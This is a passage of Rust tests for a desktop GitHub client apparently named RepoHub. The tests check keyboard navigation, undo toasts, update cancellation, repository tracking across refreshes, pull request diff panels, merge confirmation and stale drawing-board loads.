        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut rt = app(Page::Overview);
        let mut t = 0.0;
        let cmd = Mods { cmd: true, ..Mods::default() };
        key(&mut rt, Key::Command('k'), cmd, &mut t);
        assert!(rt.state.palette.is_some(), "⌘K opens it");
        let (_, list_top) = rt.find("palette-0").unwrap();
        for _ in 0..20 {
            key(&mut rt, Key::Down, Mods::default(), &mut t);
        }
        for _ in 0..20 {
            t += 0.05;
            rt.frame(t);
        }
        assert_eq!(rt.state.palette.as_ref().unwrap().selected, 20);
        let (_, y) = rt.find("palette-20").expect("row 20 exists");
        assert!(y > list_top - 20.0 && y < list_top + 420.0, "row 20 is inside the list's 420 points ({y}, list from {list_top})");
        key(&mut rt, Key::Escape, Mods::default(), &mut t);
        assert!(rt.state.palette.is_none(), "Esc closes it");
    }

    #[test]
    fn esc_closes_what_is_open_and_cmd_bracket_goes_back() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut rt = app(Page::Pulls);
        let mut t = 0.0;
        let pr = rt.state.data.pulls.iter().find(|p| p.number == 14).unwrap().clone();
        rt.update(|s, _| { s.open_thread(&pr.repo, 14, true); s.notify("hello"); });
        rt.frame(0.1);
        // The conversation first, then the message.
        key(&mut rt, Key::Escape, Mods::default(), &mut t);
        assert!(rt.state.thread.is_none() && rt.state.page == Page::Pulls);
        key(&mut rt, Key::Escape, Mods::default(), &mut t);
        assert!(rt.state.toast.is_none());
        // Nothing open: Esc does nothing else.
        key(&mut rt, Key::Escape, Mods::default(), &mut t);
        assert_eq!(rt.state.page, Page::Pulls);

        let cmd = Mods { cmd: true, ..Mods::default() };
        rt.update(|s, _| s.open(0));
        rt.frame(1.0);
        assert!(matches!(rt.state.page, Page::Repo(_)));
        key(&mut rt, Key::Command('['), cmd, &mut t);
        assert_eq!(rt.state.page, Page::Repos, "⌘[ goes from a repository to the list");
        rt.update(|s, _| s.open_thread(&pr.repo, 14, true));
        rt.frame(2.0);
        key(&mut rt, Key::Command('['), cmd, &mut t);
        assert!(rt.state.thread.is_none() && rt.state.page == Page::Repos, "and out of a conversation");
    }
}

#[cfg(all(test, not(target_arch = "wasm32")))]
mod fix66_tests {
    use crate::{App, Page, github, state};

    fn app() -> App {
        let mut s = crate::init();
        s.data = crate::model::Data::sample();
        s.pending_place = None;
        s.page = Page::Issues;
        s
    }

    #[test]
    fn a_deleted_theme_comes_back_with_undo() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let dir = std::env::temp_dir().join(format!("repohub-undo-{}", std::process::id()));
        // SAFETY: the lock keeps other environment-changing tests out.
        unsafe { std::env::set_var("REPOHUB_DATA_DIR", &dir) };
        let mut s = app();
        let first = s.looks.all.iter().find(|t| t.builtin).unwrap().id.clone();
        let id = s.looks.duplicate(&first).unwrap();
        s.looks.dark = id.clone();
        let at = s.looks.all.iter().position(|t| t.id == id).unwrap();
        let before = s.looks.all.len();
        s.delete_look(&id);
        assert_eq!(s.looks.all.len(), before - 1);
        assert_ne!(s.looks.dark, id, "the dark theme fell back to a ready-made one");
        assert!(s.toast.as_ref().is_some_and(|t| t.undo.is_some()), "the toast offers Undo");
        s.undo();
        assert_eq!(s.looks.all.len(), before);
        assert_eq!(s.looks.all[at].id, id, "back where it was");
        assert_eq!(s.looks.dark, id, "and the dark theme again");
        assert!(s.toast.as_ref().is_some_and(|t| t.text.starts_with("Restored") && t.undo.is_none()));
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn a_closed_issue_offers_undo_and_comes_back_when_reopened() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = app();
        let issue = s.data.issues[0].clone();
        let count = s.data.issues.len();
        s.apply_done(&issue.repo, github::Done::Closed(issue.number));
        assert_eq!(s.data.issues.len(), count - 1);
        let undo = s.toast.as_ref().and_then(|t| t.undo.clone());
        assert!(matches!(&undo, Some(state::Undo::Reopen { issue: i, .. }) if i.number == issue.number));
        // The toast's button is on screen.
        let mut rt = rune::Runtime::new(s, crate::view, (1180.0, 760.0), rune::Env::new(true, 1.0));
        rt.frame(0.0);
        assert!(rt.find("toast-undo").is_some());
        let mut s = rt.state;
        // Pressing Undo asks GitHub to reopen it (the sample data can't, so it waits); once
        // GitHub says it's reopened, it's back in the list, once.
        s.reopening.push(issue.clone());
        s.apply_done(&issue.repo, github::Done::Reopened(issue.number));
        s.apply_done(&issue.repo, github::Done::Reopened(issue.number));
        assert_eq!(s.data.issues.len(), count);
        assert_eq!(s.data.issues[0].number, issue.number);
        assert!(s.reopening.is_empty());
    }

    #[test]
    fn a_change_with_no_local_copy_says_so() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let dir = std::env::temp_dir().join(format!("repohub-noclone-{}", std::process::id()));
        // SAFETY: the lock keeps other environment-changing tests out.
        unsafe {
            std::env::set_var("REPOHUB_DATA_DIR", &dir);
            std::env::set_var("REPOHUB_REPOS_DIR", &dir);
        }
        let mut s = app();
        s.git_run(0, "Pushing", "Pushed", |_| Ok(String::new()));
        assert!(s.toast.as_ref().is_some_and(|t| t.text.contains("no local copy")), "it doesn't return silently");
        assert!(s.git_job.is_none());
        let _ = std::fs::remove_dir_all(dir);
    }
}

#[cfg(test)]
mod fix60_tests {
    use crate::Page;

    fn sample_release() -> crate::update::Release {
        crate::update::Release {
            sha: "abc1234def".into(),
            published: 1_700_000_000,
            asset: "RepoHub-linux-x86_64.tar.gz".into(),
            url: "https://example.invalid/pkg.tar.gz".into(),
            size: 100,
            sums: None,
            sig: None,
            notes: String::new(),
        }
    }

    #[cfg(not(target_arch = "wasm32"))]
    #[test]
    fn failed_background_update_check_keeps_available_and_cancel_restores_it() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = crate::init();
        let rel = sample_release();

        // Background check skips Available.
        s.update = crate::update::Update::Available(rel.clone());
        assert_eq!(s.update.start_check(false), None);
        assert_eq!(s.update, crate::update::Update::Available(rel.clone()));

        // Manual check from Available preserves Available on transient failure.
        let prior = s.update.start_check(true).expect("manual check runs from Available");
        s.apply_update_check(prior, true, Err("offline".into()));
        assert_eq!(s.update, crate::update::Update::Available(rel.clone()));

        // Cancelling during Downloading restores Available and marks job cancelled.
        let job = crate::UpdateJob::new();
        s.update_cancel = Some(job.clone());
        s.update = crate::update::Update::Downloading { release: rel.clone(), percent: 45 };
        s.cancel_update();
        assert!(job.was_cancelled());
        assert!(!job.begin_install(), "cancelled job must not proceed to install");
        assert!(s.update_cancel.is_none());
        assert_eq!(s.update, crate::update::Update::Available(rel.clone()));

        // Once the worker begins Installing, cancel_update refuses to revert to Available.
        let job2 = crate::UpdateJob::new();
        assert!(job2.begin_install());
        s.update_cancel = Some(job2.clone());
        s.update = crate::update::Update::Downloading { release: rel.clone(), percent: 100 };
        s.cancel_update();
        assert!(!job2.was_cancelled());
        assert_eq!(s.update, crate::update::Update::Installing);

        // Once already Installing, cancel_update is a no-op.
        s.cancel_update();
        assert_eq!(s.update, crate::update::Update::Installing);
    }

    #[test]
    fn ui_cancel_only_during_download_and_mixed_pr_count_capped() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = crate::init();
        s.now = 1_700_000_000;
        s.data = crate::model::Data::sample_at(s.now);
        let rel = sample_release();
        s.page = crate::Page::Settings;
        // The version and its updates are in Settings → About.
        s.settings_section = crate::state::SettingsSection::About;
        s.update = crate::update::Update::Downloading { release: rel.clone(), percent: 40 };

        let mut rt = rune::Runtime::new(s, crate::view, (1180.0, 2400.0), rune::Env::new(true, 1.0));
        rt.frame(0.0);

        // Both banner and Settings show Cancel during Downloading.
        let (x, y) = rt.find("update-cancel").expect("banner Cancel shown while downloading");
        assert!(rt.find("update-cancel-settings").is_some(), "settings Cancel shown while downloading");

        // Clicking Cancel in the banner restores Available and hides both Cancel buttons.
        rt.pointer_move(x, y);
        rt.pointer_down(x, y);
        rt.pointer_up(x, y);
        rt.frame(0.0);
        assert_eq!(rt.state.update, crate::update::Update::Available(rel));
        assert!(rt.find("update-cancel").is_none(), "no banner Cancel when Available");
        assert!(rt.find("update-cancel-settings").is_none(), "no settings Cancel when Available");

        // Past downloading (Installing): Cancel must not be offered anywhere.
        rt.update(|s, _| s.update = crate::update::Update::Installing);
        rt.frame(0.0);
        assert!(rt.find("update-cancel").is_none(), "no banner Cancel when Installing");
        assert!(rt.find("update-cancel-settings").is_none(), "no settings Cancel when Installing");

        // 40 mixed PRs (12 open + 28 merged) shows "12+" on Overview and Sidebar; 39 shows "12".
        rt.update(|s, _| {
            s.page = crate::Page::Overview;
            s.data.pulls = (0..crate::model::SEARCH_CAP).map(|i| crate::model::Pull { labels: Vec::new(),
                number: i as u32 + 1,
                title: format!("PR #{i}"),
                repo: "a/b".into(),
                author: "u".into(),
                state: if i < 12 { crate::model::PullState::Open } else { crate::model::PullState::Merged },
                checks: None,
                updated_at: s.now,
                comments: 0,
                url: String::new(),
            }).collect();
        });
        rt.frame(0.0);
        let has_text = |rt: &rune::Runtime<crate::App>, needle: &str| {
            rt.elements().iter().any(|e| e.text.as_deref() == Some(needle))
        };
        let metric_has = |rt: &rune::Runtime<crate::App>, key: &str, needle: &str| {
            rt.elements().iter().any(|e| e.key.as_deref() == Some(key) && e.label.as_deref().is_some_and(|l| l.starts_with(needle)))
        };
        assert!(metric_has(&rt, "metric-Open pull requests", "12+ "), "Overview metric shows 12+");
        assert!(has_text(&rt, "12+"), "Sidebar badge shows 12+");

        rt.update(|s, _| {
            s.data.pulls.pop();
        });
        rt.frame(0.0);
        assert!(metric_has(&rt, "metric-Open pull requests", "12 "), "Overview metric shows 12 below cap");
        assert!(!has_text(&rt, "12+"), "12+ disappears below cap");
        assert!(has_text(&rt, "12"), "Sidebar badge shows 12 below cap");
    }

    #[test]
    fn locally_created_items_store_timestamps_that_advance_with_now() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = crate::init();
        s.now = 1_700_000_000;
        s.data = crate::model::Data::sample_at(s.now);
        s.form_title = Some("New bug".into());
        s.apply_done_inner(&s.data.repos[0].full_name.clone(), crate::github::Done::Issue(crate::github::Created { number: 999, url: "https://example.invalid/999".into() }));
        assert_eq!(s.data.issues[0].created_at, 1_700_000_000);
        assert_eq!(s.data.issues[0].age_ago(1_700_000_300), "5 minutes ago");

        s.pull_meta = Some(("New PR".into(), false));
        s.apply_done_inner(&s.data.repos[0].full_name.clone(), crate::github::Done::Pull(crate::github::Created { number: 1000, url: "https://example.invalid/1000".into() }));
        assert_eq!(s.data.pulls[0].updated_at, 1_700_000_000);
        assert_eq!(s.data.pulls[0].age_ago(1_700_007_200), "2 hours ago");
    }

    #[test]
    fn page_repo_tracks_by_identity_across_repo_reordering_and_removal() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = crate::init();
        s.data = crate::model::Data::sample_at(1_700_000_000);
        assert!(s.data.repos.len() >= 2);
        let repo_1 = s.data.repos[1].full_name.clone();

        // Open repository 1, set branch, tab, local_dir, local_file
        s.open(1);
        s.set_tab(1, crate::RepoTab::Terminal);
        s.branch_of.insert(repo_1.clone(), "feature-x".into());
        s.local_dir = "src/components".into();
        s.local_file = Some(("mod.rs".into(), crate::state::Load::Ready(crate::local::Content::Missing)));

        assert_eq!(s.page, Page::Repo(repo_1.clone()));
        assert_eq!(s.tab, crate::RepoTab::Terminal);
        assert_eq!(s.repo_index(), Some(1));
        assert_eq!(s.place().repo.as_deref(), Some(repo_1.as_str()));

        // Simulate refresh reordering data.repos (e.g. repo_1 sorted before repo_0)
        let mut reordered = s.data.clone();
        reordered.repos.swap(0, 1);
        s.apply(s.load_gen, Ok(reordered));

        // The page should still track repo_1, but its index is now 0.
        // Its tab, branch_of, local_dir, and local_file must survive the reorder.
        assert_eq!(s.page, Page::Repo(repo_1.clone()));
        assert_eq!(s.tab, crate::RepoTab::Terminal);
        assert_eq!(s.branch_of.get(&repo_1).map(|b| b.as_str()), Some("feature-x"));
        assert_eq!(s.local_dir, "src/components");
        assert_eq!(s.local_file.as_ref().map(|(f, _)| f.as_str()), Some("mod.rs"));
        assert_eq!(s.repo_index(), Some(0));
        assert_eq!(s.place().repo.as_deref(), Some(repo_1.as_str()));

        // Simulate having a board open for repo_1
        s.open_board(0, "architecture".into(), true);
        assert!(s.board.is_some(), "board editor is open");

        // Simulate refresh where repo_1 was deleted/unloaded from GitHub
        let mut without_repo_1 = s.data.clone();
        without_repo_1.repos.retain(|r| r.full_name != repo_1);
        s.apply(s.load_gen, Ok(without_repo_1));

        // Missing repository falls back safely to Page::Repos and closes board via leave_tab
        assert_eq!(s.page, Page::Repos);
        assert_eq!(s.repo_index(), None);
        assert!(s.board.is_none(), "board must be cleared on fallback to Repos");
    }

    #[test]
    fn apply_done_updates_intended_repository_after_reordering() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = crate::init();
        s.now = 1_700_000_000;
        s.data = crate::model::Data::sample_at(s.now);
        assert!(s.data.repos.len() >= 2);
        let repo_0 = s.data.repos[0].full_name.clone();
        let repo_1 = s.data.repos[1].full_name.clone();
        let issues_1_before = s.data.repos[1].issues;

        // Initialize branches cache for repo_1
        s.branches.insert(repo_1.clone(), crate::state::Load::Ready(vec!["main".into()]));

        // Reorder repos before asynchronous done response arrives
        s.data.repos.swap(0, 1);
        assert_eq!(s.data.repos[0].full_name, repo_1);
        assert_eq!(s.data.repos[1].full_name, repo_0);

        // A Done::Branch for repo_1 arrives
        s.apply_done(&repo_1, crate::github::Done::Branch("feature/reorder".into()));
        if let Some(crate::state::Load::Ready(branches)) = s.branches.get(&repo_1) {
            assert!(branches.contains(&"feature/reorder".to_string()), "branches list updated for repo_1");
        } else {
            panic!("branches cache missing for repo_1");
        }
        assert_eq!(s.branch_of.get(&repo_1).map(|b| b.as_str()), Some("feature/reorder"));

        // A Done::Issue for repo_1 arrives
        s.form_title = Some("New reordered issue".into());
        s.apply_done(&repo_1, crate::github::Done::Issue(crate::github::Created { number: 888, url: "https://example.invalid/888".into() }));
        assert_eq!(s.data.issues[0].number, 888);
        assert_eq!(s.data.issues[0].repo, repo_1);
        let repo_1_entry = s.data.repos.iter().find(|r| r.full_name == repo_1).unwrap();
        assert_eq!(repo_1_entry.issues, issues_1_before + 1);

        // A Done::Closed for repo_1 arrives
        s.apply_done(&repo_1, crate::github::Done::Closed(888));
        assert!(s.data.issues.iter().all(|x| x.number != 888));
        let repo_1_entry = s.data.repos.iter().find(|r| r.full_name == repo_1).unwrap();
        assert_eq!(repo_1_entry.issues, issues_1_before);
    }

    #[test]
    fn apply_done_on_unloaded_external_repo_does_not_mutate_loaded_same_name_repo() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = crate::init();
        s.now = 1_700_000_000;
        s.data = crate::model::Data::sample_at(s.now);
        // Ensure alice/app is in data.repos
        s.data.repos[0].owner = "alice".into();
        s.data.repos[0].name = "app".into();
        s.data.repos[0].full_name = "alice/app".into();
        s.data.repos[0].issues = 5;

        // Add a pull request and an issue belonging to external repo other-org/app
        s.data.pulls.insert(0, crate::model::Pull { labels: Vec::new(),
            number: 42,
            title: "External PR".into(),
            repo: "other-org/app".into(),
            author: "bob".into(),
            state: crate::model::PullState::Open,
            checks: None,
            updated_at: s.now,
            comments: 0,
            url: "https://github.com/other-org/app/pull/42".into(),
        });
        s.data.issues.insert(0, crate::model::Issue { labels: Vec::new(), assignees: Vec::new(),
            number: 77,
            title: "External Issue".into(),
            repo: "other-org/app".into(),
            label: None,
            created_at: s.now,
            comments: 0,
            url: "https://github.com/other-org/app/issues/77".into(),
        });

        // Merge PR 42 on other-org/app
        s.apply_done_inner("other-org/app", crate::github::Done::Merged(42));
        assert_eq!(s.data.pulls[0].number, 42);
        assert_eq!(s.data.pulls[0].state, crate::model::PullState::Merged, "external PR updated to merged");

        // Close issue 77 on other-org/app
        s.apply_done_inner("other-org/app", crate::github::Done::Closed(77));
        assert!(s.data.issues.iter().all(|x| !(x.number == 77 && x.repo == "other-org/app")), "external issue removed");

        // alice/app issues count MUST remain unchanged
        assert_eq!(s.data.repos[0].issues, 5, "alice/app issues count must not be decremented by external repo close");
    }

    #[test]
    fn plugin_page_and_plugin_tab_reset_safely_when_unloaded() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = crate::init();
        s.data = crate::model::Data::sample();

        // Simulate a plugin tab and plugin page set
        s.page = Page::Plugin("test-plugin".into());
        s.plugin_tab = Some("test-plugin".into());

        // Refresh runs with no plugins matching "test-plugin"
        s.apply(s.load_gen, Ok(s.data.clone()));

        assert_eq!(s.page, Page::Overview, "removed plugin page falls back to Overview");
        assert_eq!(s.plugin_tab, None, "removed plugin tab resets to None");
    }

    #[test]
    fn pull_diff_isolated_from_changes_tab_diff_state() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = crate::init();
        s.now = 1_700_000_000;
        s.data = crate::model::Data::sample_at(s.now);
        let repo_full = s.data.repos[0].full_name.clone();

        // Set up Changes tab diff with local changes
        s.diff_of = Some(crate::diffs::DiffOf::Local(repo_full.clone()));
        s.diff_load = Some(crate::state::Load::Ready(()));
        let local_file = rune_kit::diff::FileDiff::between(Some("foo.rs".into()), Some("foo.rs".into()), "old\n", "new\n");
        s.diff.set_files(vec![local_file]);
        assert_eq!(s.diff.files().len(), 1);

        // Open a pull request diff
        s.open_pull_diff(repo_full.clone(), 14);
        assert_eq!(s.pull_diff_of, Some((repo_full.clone(), 14)));
        assert_eq!(s.pull_diff_load, Some(crate::state::Load::Ready(())));
        assert!(!s.pull_diff.files().is_empty(), "sample PR diff loaded");

        // The Changes tab diff must remain completely untouched
        assert_eq!(s.diff_of, Some(crate::diffs::DiffOf::Local(repo_full.clone())));
        assert_eq!(s.diff.files().len(), 1, "local changes diff not clobbered by PR diff");

        // Closing pull diff leaves local diff intact
        s.close_pull_diff();
        assert_eq!(s.pull_diff_of, None);
        assert_eq!(s.pull_diff_load, None);
        assert!(s.pull_diff.files().is_empty());
        assert_eq!(s.diff_of, Some(crate::diffs::DiffOf::Local(repo_full)));
        assert_eq!(s.diff.files().len(), 1);
    }

    #[test]
    fn navigation_and_leave_tab_clears_pull_diff() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = crate::init();
        s.now = 1_700_000_000;
        s.data = crate::model::Data::sample_at(s.now);
        let repo_full = s.data.repos[0].full_name.clone();

        s.open(0);
        s.open_pull_diff(repo_full.clone(), 14);
        assert!(s.pull_diff_of.is_some());

        // Navigating to Overview cleans up pull diff
        s.go(Page::Overview);
        assert!(s.pull_diff_of.is_none());
        assert!(s.pull_diff_load.is_none());
        assert!(s.pull_diff.files().is_empty());

        // Opening again and switching tab
        s.open(0);
        s.set_tab(0, crate::RepoTab::Pulls);
        s.open_pull_diff(repo_full.clone(), 14);
        assert!(s.pull_diff_of.is_some());

        s.set_tab(0, crate::RepoTab::Code);
        assert!(s.pull_diff_of.is_none(), "switching tabs calls leave_tab and clears pull diff");
    }

    #[test]
    fn pull_panel_merge_requires_confirmation() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = crate::init();
        let mut cfg = (*s.cfg).clone();
        cfg.user = Some("alice".into());
        cfg.token = Some("tok_alice".into());
        s.cfg = std::sync::Arc::new(cfg);
        s.now = 1_700_000_000;
        s.data = crate::model::Data::sample_at(s.now);
        s.data.sample = false;
        // sample PR 14 is open on francescodibella.github.io
        let pr = s.data.pulls.iter().find(|p| p.number == 14).expect("sample PR 14 exists");
        let repo = crate::changes_page::pull_repo(&pr.url).expect("repo parsed");
        let key = crate::actions::busy_key(&repo, pr.number);

        s.page = Page::Pulls;
        s.open_pull_diff(repo.clone(), pr.number);

        let mut rt = rune::Runtime::new(s, crate::view, (1180.0, 2400.0), rune::Env::new(true, 1.0));
        rt.frame(0.0);

        // Initially pull-merge button is present, confirm/cancel are not
        assert!(rt.find("pull-merge").is_some());
        assert!(rt.find("pull-merge-confirm").is_none());
        assert!(rt.find("pull-merge-cancel").is_none());

        // Click Merge button
        let (x, y) = rt.find("pull-merge").expect("pull-merge button found");
        rt.pointer_move(x, y);
        rt.pointer_down(x, y);
        rt.pointer_up(x, y);
        rt.frame(0.1);

        // Confirmation must now be displayed
        assert_eq!(rt.state.confirm_merge.as_deref(), Some(key.as_str()));
        assert!(rt.find("pull-merge-confirm").is_some(), "confirmation merge button shown");
        assert!(rt.find("pull-merge-cancel").is_some(), "cancel button shown");
        assert!(rt.find("pull-merge").is_none(), "initial merge button replaced by confirm");

        // Click Cancel
        let (cx, cy) = rt.find("pull-merge-cancel").expect("cancel button found");
        rt.pointer_move(cx, cy);
        rt.pointer_down(cx, cy);
        rt.pointer_up(cx, cy);
        rt.frame(0.1);

        assert_eq!(rt.state.confirm_merge, None);
        assert!(rt.find("pull-merge").is_some(), "initial merge button restored");
        assert!(rt.find("pull-merge-confirm").is_none());
    }

    #[test]
    fn files_button_toggles_diff_and_highlights_active_row() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = crate::init();
        s.now = 1_700_000_000;
        s.data = crate::model::Data::sample_at(s.now);
        let pr = s.data.pulls.iter().find(|p| p.number == 14).expect("sample PR 14 exists");
        let repo = crate::changes_page::pull_repo(&pr.url).expect("repo parsed");
        let pr_repo = pr.repo.clone();
        let pr_number = pr.number;

        s.page = Page::Pulls;
        let mut rt = rune::Runtime::new(s, crate::view, (1180.0, 2400.0), rune::Env::new(true, 1.0));
        rt.frame(0.0);

        // Initially pull diff is closed
        assert_eq!(rt.state.pull_diff_of, None);
        assert!(rt.find("pull-diff").is_none());

        // Click Files button on PR 14
        let files_key = format!("files-{pr_repo}-{pr_number}");
        let (fx, fy) = rt.find(&files_key).expect("files button found on PR 14");
        rt.pointer_move(fx, fy);
        rt.pointer_down(fx, fy);
        rt.pointer_up(fx, fy);
        rt.frame(0.1);

        assert_eq!(rt.state.pull_diff_of, Some((repo.clone(), pr_number)));
        assert!(rt.find("pull-diff").is_some(), "pull diff panel is open");

        // Clicking Files again toggles it closed
        let (fx2, fy2) = rt.find(&files_key).expect("files button found on active PR 14");
        rt.pointer_move(fx2, fy2);
        rt.pointer_down(fx2, fy2);
        rt.pointer_up(fx2, fy2);
        rt.frame(0.1);

        assert_eq!(rt.state.pull_diff_of, None);
        assert!(rt.find("pull-diff").is_none(), "pull diff closed by toggling files button");
    }

    #[test]
    fn repo_tab_pulls_scopes_diff_to_matching_repository() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = crate::init();
        s.now = 1_700_000_000;
        s.data = crate::model::Data::sample_at(s.now);
        let repo0 = s.data.repos[0].full_name.clone();
        let repo1 = s.data.repos[1].full_name.clone();

        // 1. Open diff on Page::Pulls, then navigate to another repo's Pulls tab
        s.page = Page::Pulls;
        s.open_pull_diff(repo0.clone(), 14);
        assert_eq!(s.pull_diff_of, Some((repo0.clone(), 14)));

        // Visit repo 1's Pulls tab: navigation clears pull diff
        s.open(1);
        s.set_tab(1, crate::RepoTab::Pulls);
        assert_eq!(s.pull_diff_of, None, "navigating to repo clears open PR diff");
        assert!(s.pull_diff.files().is_empty());

        let mut rt = rune::Runtime::new(s, crate::view, (1180.0, 2400.0), rune::Env::new(true, 1.0));
        rt.frame(0.0);
        assert!(rt.find("pull-diff").is_none(), "pull-diff not shown when cleared");

        // 2. Even if pull_diff_of is set to a different repo, RepoTab::Pulls refuses to render it
        rt.update(|s, _| {
            s.pull_diff_of = Some((repo0, 14));
            s.pull_diff_load = Some(crate::state::Load::Ready(()));
        });
        rt.frame(0.0);
        assert_eq!(rt.state.page, Page::Repo(repo1));
        assert!(rt.find("pull-diff").is_none(), "foreign repo diff must never render on another repo's Pulls tab");
    }

    #[test]
    fn pressing_files_on_last_row_scrolls_pull_diff_into_view() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = crate::init();
        s.now = 1_700_000_000;
        // Generate enough PRs so the list extends well beyond a 720px viewport
        let mut prs = Vec::new();
        for i in 1..=20 {
            prs.push(crate::model::Pull { labels: Vec::new(),
                number: i,
                title: format!("Pull request #{i} with long description to take space"),
                repo: "francescodibella.github.io".into(),
                author: "alice".into(),
                state: crate::model::PullState::Open,
                checks: Some(crate::model::Checks::Passing),
                updated_at: s.now - (i as i64 * 3600),
                comments: 2,
                url: format!("https://github.com/francescodibella/francescodibella.github.io/pull/{i}"),
            });
        }
        s.data.pulls = prs;
        s.page = Page::Pulls;

        // Realistic viewport height (1180 x 720)
        let mut rt = rune::Runtime::new(s, crate::view, (1180.0, 720.0), rune::Env::new(true, 1.0));
        rt.frame(0.0);

        // Find the last row's Files button (files-francescodibella.github.io-20)
        let last_files_key = "files-francescodibella.github.io-20";

        // Scroll the viewport so the last row is brought into view
        rt.update(|_, tx| tx.scroll_into_view(last_files_key));
        rt.frame(0.1);

        let (fx, fy) = rt.find(last_files_key).expect("last PR files button found");
        assert!(fy < 720.0 && fy > 0.0, "files button must now be in viewport: ({fx}, {fy})");

        // Click the Files button
        rt.pointer_move(fx, fy);
        rt.pointer_down(fx, fy);
        rt.pointer_up(fx, fy);

        // Allow scroll and layout to settle
        rt.frame(0.1);
        rt.frame(0.1);

        assert!(rt.state.pull_diff_of.is_some(), "pull diff is opened");
        let diff_el = rt.elements().into_iter().find(|e| e.key.as_deref() == Some("pull-diff")).expect("pull-diff element found");
        let top = diff_el.rect[1];
        let height = diff_el.rect[3];
        assert!(top < 720.0 && top + height > 0.0, "pull-diff must be visible in viewport [0, 720], rect={:?}", diff_el.rect);
    }
}

#[cfg(test)]
mod fix56_tests {
    use super::*;
    use crate::board::{Element, Kind};
    use crate::state::Save;
    use super::load_gen_tests::TempDataDir;

    fn setup_app() -> App {
        let mut s = crate::init();
        s.data = crate::model::Data::sample();
        s.data.repos[0].owner = "owner".into();
        s.data.repos[0].name = "repo".into();
        s.data.repos[0].full_name = "owner/repo".into();
        s.data.repos[0].branch = "main".into();
        s
    }

    #[test]
    fn stale_open_board_load_does_not_overwrite_another_drawing() {
        let mut s = setup_app();
        let (full, branch) = s.notes_branch(0).unwrap();

        // 1. Open drawing A ("Arch").
        s.open_board(0, "Arch".into(), false);
        let id_a = (full.clone(), branch.clone(), "Arch".into());
        let epoch_a = s.load_gen;
        let board_epoch_a = s.board_load_gen;
        assert_eq!(s.board.as_ref().map(|b| b.name.as_str()), Some("Arch"));
        assert_eq!(s.board.as_ref().map(|b| &b.save), Some(&Save::Loading));

        // 2. Before Arch finishes loading, user switches to drawing B ("Plan").
        s.open_board(0, "Plan".into(), false);
        let id_b = (full.clone(), branch.clone(), "Plan".into());
        let epoch_b = s.load_gen;
        let board_epoch_b = s.board_load_gen;
        assert_eq!(s.board.as_ref().map(|b| b.name.as_str()), Some("Plan"));
        assert_ne!(board_epoch_a, board_epoch_b);

        // 3. Stale load result arrives for Arch with some elements.
        let arch_json = serde_json::json!({
            "type": "excalidraw", "version": 2,
            "elements": [{
                "id": "arch-rect", "type": "rectangle",
                "x": 10.0, "y": 10.0, "width": 50.0, "height": 50.0,
                "points": [], "strokeColor": "#1e1e1e", "backgroundColor": "transparent",
                "strokeWidth": 2.0, "seed": 1
            }]
        }).to_string();

        s.apply_board_load(epoch_a, board_epoch_a, id_a, Ok(Some(arch_json)));

        // Stale result for Arch MUST be ignored: Plan is still open and empty.
        let b = s.board.as_ref().unwrap();
        assert_eq!(b.name, "Plan");
        assert!(b.elements.is_empty(), "Plan must not receive elements from Arch");
        assert_eq!(b.save, Save::Loading);

        // 4. Now valid load result for Plan arrives.
        let plan_json = serde_json::json!({
            "type": "excalidraw", "version": 2,
            "elements": [{
                "id": "plan-ellipse", "type": "ellipse",
                "x": 20.0, "y": 20.0, "width": 60.0, "height": 60.0,
                "points": [], "strokeColor": "#1e1e1e", "backgroundColor": "transparent",
                "strokeWidth": 2.0, "seed": 2
            }]
        }).to_string();

        s.apply_board_load(epoch_b, board_epoch_b, id_b, Ok(Some(plan_json)));
        let b = s.board.as_ref().unwrap();
        assert_eq!(b.name, "Plan");
        assert_eq!(b.elements.len(), 1);
        assert_eq!(b.elements[0].id, "plan-ellipse");
        assert_eq!(b.save, Save::Saved);
    }

    #[test]
    fn stale_open_board_load_does_not_overwrite_newly_created_drawing() {
        let mut s = setup_app();
        let (full, branch) = s.notes_branch(0).unwrap();

        // 1. Open drawing A ("Arch") to load.
        s.open_board(0, "Arch".into(), false);
        let id_a = (full.clone(), branch.clone(), "Arch".into());
        let epoch_a = s.load_gen;
        let board_epoch_a = s.board_load_gen;

        // 2. User creates a new drawing with the same name (new=true).
        s.open_board(0, "Arch".into(), true);
        assert_eq!(s.board.as_ref().map(|b| b.name.as_str()), Some("Arch"));
        assert_eq!(s.board.as_ref().map(|b| &b.save), Some(&Save::Saved));
        assert!(s.board.as_ref().unwrap().elements.is_empty());

        // 3. Stale load for Arch arrives.
        let arch_json = serde_json::json!({
            "type": "excalidraw", "version": 2,
            "elements": [{
                "id": "stale-1", "type": "rectangle",
                "x": 0.0, "y": 0.0, "width": 100.0, "height": 100.0,
                "points": [], "strokeColor": "#000", "backgroundColor": "transparent",
                "strokeWidth": 2.0, "seed": 1
            }]
        }).to_string();

        s.apply_board_load(epoch_a, board_epoch_a, id_a, Ok(Some(arch_json)));

        // The newly created drawing MUST remain clean.
        let b = s.board.as_ref().unwrap();
